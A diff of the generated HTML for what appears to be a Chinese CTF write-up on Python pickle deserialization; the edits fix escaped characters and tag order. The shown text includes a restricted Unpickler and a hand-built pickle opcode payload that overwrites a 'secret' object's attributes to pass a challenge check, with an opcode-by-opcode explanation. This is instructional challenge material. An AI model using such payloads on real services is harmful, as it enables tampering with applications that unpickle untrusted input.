@@ -410,16 +410,16 @@ import pickl">
                                 <span class="chip bg-color">wp</span>
                             </a>
                         
+                            <a href="/tags/python/" target="_blank">
+                                <span class="chip bg-color">python</span>
+                            </a>
+                        
                             <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">
                                 <span class="chip bg-color">反序列化</span>
                             </a>
                         
                             <a href="/tags/pickle/" target="_blank">
                                 <span class="chip bg-color">pickle</span>
-                            </a>
-                        
-                            <a href="/tags/python/" target="_blank">
-                                <span class="chip bg-color">python</span>
                             </a>
                         
                     </div>
@@ -449,7 +449,7 @@ import pickl">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        1.4k
+                        1.3k
                     </div>
                     
 
@@ -491,7 +491,7 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
         self<span class="token punctuation">.</span>category <span class="token operator">=</span> category
 
     <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> f<span class="token string">'Animal(name=&amp;#123self.name!r&amp;#125, category=&amp;#123self.category!r&amp;#125)'</span>
+        <span class="token keyword">return</span> f<span class="token string">'Animal(name={self.name!r}, category={self.category!r})'</span>
 
     <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>
         <span class="token keyword">return</span> type<span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> Animal <span class="token operator">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token operator">and</span> self<span class="token punctuation">.</span>category <span class="token operator">==</span> other<span class="token punctuation">.</span>category
@@ -501,7 +501,7 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
     <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
         <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
             <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
-        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '&amp;#37s.&amp;#37s' is forbidden"</span> <span class="token operator">&amp;</span>#<span class="token number">37</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 
 <span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -552,8 +552,8 @@ read
 S&#39;secret.py&#39;
 oo.</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>查资料的时候看到的一个opcode解释和使用样例的连接<br><a href="https://xz.aliyun.com/t/7012" target="_blank" rel="noopener">https://xz.aliyun.com/t/7012</a></p>
 <h2 id="Null的wp"><a href="#Null的wp" class="headerlink" title="Null的wp"></a>Null的wp</h2><p>比赛结束之后看到了null的wp，他们的payload思路不同，直接重新引入一个secret模块进行覆盖，然后判断为真也可通过判断<br>payload：</p>
-<pre class=" language-python"><code class="language-python">\x80\x03c__main__\nsecret\n<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125(X\x04\x00\x00\x00nameX\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\x00\x00\x00233ub0c__main__\nAnimal\n)\x81&amp;#125(X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\x00\x00\x00233ub.</span></code></pre>
-<p>这里首先用c获取一个导入main中的secret，然后用&amp;#125压入一个空字典，(设置Mark，用X接连填入参数，u将Mark后的数据弹出添加到之前的空字典中，使用b修改实例的__dict__（存储当前实例的属性），至此完成了对secret属性的修改，然后用0将其pop出栈，开始构建animal实例，之后的部分再创建一个和覆盖过的属性相同的对象就可以通过检测了<br>构造时先引入animal，用)压入一个空元组，\x81表示用class的__new__方法通过元组创建实例，(放入一个Mark，X压入字符串，q表示一个1byte大小的参数，X压入参数，u将其作为键值对弹出，b更新字典，完成对animal的构建，.结束pickle</p>
+<pre class=" language-python"><code class="language-python">\x80\x03c__main__\nsecret\n<span class="token punctuation">}</span><span class="token punctuation">(</span>X\x04\x00\x00\x00nameX\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\x00\x00\x00233ub0c__main__\nAnimal\n<span class="token punctuation">)</span>\x81<span class="token punctuation">}</span><span class="token punctuation">(</span>X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\x00\x00\x00233ub<span class="token punctuation">.</span></code></pre>
+<p>这里首先用c获取一个导入main中的secret，然后用}压入一个空字典，(设置Mark，用X接连填入参数，u将Mark后的数据弹出添加到之前的空字典中，使用b修改实例的__dict__（存储当前实例的属性），至此完成了对secret属性的修改，然后用0将其pop出栈，开始构建animal实例，之后的部分再创建一个和覆盖过的属性相同的对象就可以通过检测了<br>构造时先引入animal，用)压入一个空元组，\x81表示用class的__new__方法通过元组创建实例，(放入一个Mark，X压入字符串，q表示一个1byte大小的参数，X压入参数，u将其作为键值对弹出，b更新字典，完成对animal的构建，.结束pickle</p>
 <p>但是没懂这个\x00这些字符是怎么来的，不懂</p>
 <p>所以自己按照这个思路重写了一个payload</p>
 <pre class=" language-python"><code class="language-python">c__main__
@@ -989,7 +989,7 @@ o<span class="token punctuation">.</span></code></pre>
         <div class="col s12 m8 l8 copy-right">
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">46.1k</span>&nbsp;字
+                class="white-color">44.4k</span>&nbsp;字
             
             
             
